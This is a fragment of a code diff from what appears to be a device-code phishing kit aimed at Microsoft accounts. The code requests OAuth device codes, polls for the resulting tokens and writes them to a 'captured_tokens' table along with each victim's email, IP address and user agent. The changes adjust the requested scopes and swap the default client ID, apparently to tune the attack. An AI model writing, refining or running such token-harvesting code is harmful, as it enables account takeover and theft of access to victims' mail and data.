@@ -11,7 +11,7 @@ async function requestDeviceCode() {
     `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`,
     new URLSearchParams({
       client_id: CLIENT_ID,
-      scope: 'offline_access openid profile email https://graph.microsoft.com/User.Read',
+      scope: 'offline_access openid profile https://graph.microsoft.com/User.Read',
     }),
     { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
   );
@@ -62,7 +62,7 @@ async function pollForTokens(deviceCode, linkId, userId, initialInterval) {
       const tenant = config.AZURE_TENANT || 'common';
 
       // Store encrypted with client_id tracking
-      const clientIdUsed = config.AZURE_CLIENT_ID || '4813382a-8fa7-425e-ab75-3b753aab3abb';
+      const clientIdUsed = config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
       await db.query(
         'INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, ip_address, user_agent, expiration, tenant, template_type, client_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?)',
         [
